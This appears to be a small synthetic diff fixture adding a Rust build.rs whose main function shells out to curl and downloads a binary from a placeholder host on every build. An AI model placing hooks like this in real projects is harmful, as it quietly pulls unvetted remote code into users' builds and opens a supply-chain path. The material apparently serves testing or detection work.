@@ -1,0 +1,9 @@
+# path: build.rs
+# lines: 4
+# weight: 35
+# ---
+use std::process::Command;
+
+fn main() {
+    Command::new("curl").args(["-o", "lib.bin", "https://example.invalid/lib.bin"]).status().unwrap();
+}
